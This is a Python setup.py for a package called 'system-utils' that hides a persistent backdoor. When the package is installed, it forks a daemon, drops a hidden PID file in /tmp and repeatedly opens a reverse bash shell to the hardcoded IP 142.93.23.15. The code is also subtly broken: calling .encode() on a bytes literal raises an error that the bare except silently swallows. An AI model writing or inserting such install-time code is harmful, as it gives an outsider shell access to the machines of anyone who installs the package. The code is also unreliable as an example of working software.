from setuptools import setup
import os
import sys
import socket
import subprocess
import time
import pty
import fcntl

def create_pid_file():
    """Ensure only one backdoor instance runs"""
    pid_file = '/tmp/.system_utils.pid'
    
    try:
        # Check if already running
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = f.read().strip()
                try:
                    # Check if process exists
                    os.kill(int(old_pid), 0)
                    # Process exists, don't start another
                    return False
                except:
                    # Process doesn't exist, remove stale pid file
                    os.remove(pid_file)
        
        # Write our PID
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        
        return True
    except:
        return False

def daemonize():
    """Proper daemonization"""
    try:
        # First fork
        if os.fork() > 0:
            return True
        
        os.setsid()
        os.chdir('/')
        os.umask(0)
        
        # Second fork
        if os.fork() > 0:
            sys.exit(0)
        
        # Create PID file
        if not create_pid_file():
            sys.exit(0)
        
        return False
    except:
        return True

def persistent_backdoor():
    ATTACKER_IP = "142.93.23.15"
    ATTACKER_PORT = 80
    
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            s.send(b"""
+------------------------------------------+
|     PERSISTENT BACKDOOR - ALIVE          |
+------------------------------------------+
| This process survives pip install        |
| Will reconnect automatically             |
| Check /tmp/.system_utils.pid for PID     |
+------------------------------------------+

$ """.encode())
            
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            pty.spawn(["/bin/bash", "--login"])
            
        except:
            time.sleep(30)
            continue

# Main execution
if daemonize():
    # Parent - just run setup
    setup(name="system-utils", version="1.0.0")
else:
    # Daemon - run backdoor
    time.sleep(5)
    persistent_backdoor()
